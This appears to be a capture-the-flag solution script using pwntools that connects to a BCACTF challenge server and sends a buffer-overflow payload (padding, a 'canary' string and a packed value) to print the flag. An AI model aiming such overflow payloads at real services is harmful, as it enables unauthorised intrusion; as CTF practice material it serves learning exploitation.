from pwn import *

io = remote('challs.bcactf.com', 32101)

payload = b'A' * 73 + b'canary' + p64(0x0) + b'FLAG'

io.sendline(payload)

io.recvuntil(b'Flag: ')

print(io.recvall().decode())
